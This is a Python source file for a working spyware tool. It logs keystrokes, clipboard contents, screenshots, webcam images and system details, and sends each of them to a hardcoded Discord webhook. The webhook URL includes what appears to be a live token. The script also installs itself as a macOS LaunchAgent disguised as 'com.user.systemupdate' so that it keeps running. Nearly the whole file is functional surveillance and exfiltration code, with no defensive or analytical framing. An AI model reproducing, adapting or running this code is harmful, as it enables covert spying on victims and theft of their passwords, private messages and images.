import logging
from pynput import keyboard
import requests
import os
import platform
import socket
import threading
import time
from PIL import ImageGrab
import clipboard
import cv2

# Your actual Discord Webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1275636071421448254/yfVS5vYWNKMHnPvEKgRnB95EZ84MXzfoVxoY5ytgNLW6k_DKx3tCmP6nMvR22G-p6uZW'

# Automatically determine the log directory based on the platform
if platform.system() == "Darwin":  # macOS
    log_dir = os.path.expanduser("~/Library/Logs/")
elif platform.system() == "Windows":
    log_dir = os.path.expanduser("~/AppData/Local/Logs/")
else:
    log_dir = "/var/log/"

# Set log file path
log_file = os.path.join(log_dir, "keylog.txt")

# Configure logging to save keystrokes locally
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')


# Function to send data to Discord via webhook
def send_to_discord(message, file_path=None):
    data = {
        "content": message
    }
    files = {}
    if file_path:
        files = {'file': open(file_path, 'rb')}
    try:
        response = requests.post(WEBHOOK_URL, json=data, files=files)
        if response.status_code == 204:
            print("Data sent successfully.")
        else:
            print("Failed to send data.")
    except Exception as e:
        print(f"An error occurred: {e}")


# Function to log keystrokes
def on_press(key):
    try:
        key_data = str(key).replace("'", "")
        if key_data == "Key.space":
            key_data = " "
        if key_data == "Key.enter":
            key_data = "\n"
        if key_data == "Key.backspace":
            key_data = "[BACKSPACE]"
        if key_data == "Key.tab":
            key_data = "[TAB]"
        if key_data == "Key.esc":
            key_data = "[ESC]"
        logging.info(f"Key logged: {key_data}")
        send_to_discord(key_data)
    except Exception as e:
        print(f"An error occurred: {e}")


# Function to capture screenshots
def capture_screenshot():
    while True:
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(log_dir, "screenshot.png")
        screenshot.save(screenshot_path)
        send_to_discord("Screenshot captured", screenshot_path)
        time.sleep(120)  # Capture every 2 minutes


# Function to log clipboard data
def log_clipboard():
    recent_data = ""
    while True:
        temp_data = clipboard.paste()
        if temp_data != recent_data:
            recent_data = temp_data
            logging.info(f"Clipboard: {recent_data}")
            send_to_discord(f"Clipboard: {recent_data}")
        time.sleep(10)  # Check clipboard every 10 seconds


# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()


# Function to get basic system information
def get_system_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    user = os.getlogin()
    system_info = f"Hostname: {hostname}\nIP Address: {ip_address}\nUser: {user}\nPlatform: {platform.system()}\nPlatform-Release: {platform.release()}\n"
    send_to_discord(f"**System Information:**\n{system_info}")


# Function to make the script persistent
def make_persistent():
    # Define the path for LaunchAgents (user-level, no sudo required)
    if platform.system() == "Darwin":  # macOS
        agent_dir = os.path.expanduser("~/Library/LaunchAgents/")
        plist_content = f'''
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
            <dict>
                <key>Label</key>
                <string>com.user.systemupdate</string>
                <key>ProgramArguments</key>
                <array>
                    <string>/usr/local/bin/python3</string>
                    <string>{os.path.realpath(__file__)}</string>
                </array>
                <key>RunAtLoad</key>
                <true/>
                <key>KeepAlive</key>
                <true/>
            </dict>
        </plist>
        '''
        # Ensure the LaunchAgents directory exists
        if not os.path.exists(agent_dir):
            os.makedirs(agent_dir)
        
        plist_path = os.path.join(agent_dir, "com.user.systemupdate.plist")
        
        # Write the plist file
        with open(plist_path, "w") as plist_file:
            plist_file.write(plist_content)
        
        # Load the plist using launchctl (no sudo required)
        os.system(f"launchctl load {plist_path}")

def capture_webcam():
    while True:
        try:
            cam = cv2.VideoCapture(0)  # Open default webcam (0)
            ret, frame = cam.read()  # Capture frame
            if ret:
                webcam_image_path = os.path.join(log_dir, "webcam.png")
                cv2.imwrite(webcam_image_path, frame)  # Save image
                send_to_discord("Webcam image captured", webcam_image_path)  # Send to Discord
            cam.release()  # Release the webcam
        except Exception as e:
            print(f"An error occurred: {e}")
        time.sleep(600)  # Wait 10 minutes before capturing another image

# Modified capture_screenshot function to send both screenshots and webcam image simultaneously
def capture_screenshot_and_webcam():
    while True:
        # Capture screenshot
        screenshot = ImageGrab.grab()
        screenshot_path = os.path.join(log_dir, "screenshot.png")
        screenshot.save(screenshot_path)
        send_to_discord("Screenshot captured", screenshot_path)
        
        # Capture webcam image
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            webcam_image_path = os.path.join(log_dir, "webcam.png")
            cv2.imwrite(webcam_image_path, frame)
            send_to_discord("Webcam image captured", webcam_image_path)
        cam.release()  # Release the webcam

        time.sleep(600)  # Capture every 10 minutes

# Start threads for different functionalities
if __name__ == "__main__":
    sent_system_info = False
    if not sent_system_info:
        get_system_info()  # Send system info to Discord
        sent_system_info = True

    make_persistent()  # Make the script persistent

    # Start threads for different functionalities if they are not already running
    if not any(thread.name == "KeyloggerThread" for thread in threading.enumerate()):
        threading.Thread(target=start_keylogger, name="KeyloggerThread").start()

    if not any(thread.name == "ScreenshotThread" for thread in threading.enumerate()):
        threading.Thread(target=capture_screenshot_and_webcam, name="ScreenshotThread").start()

    if not any(thread.name == "ClipboardThread" for thread in threading.enumerate()):
        threading.Thread(target=log_clipboard, name="ClipboardThread").start()
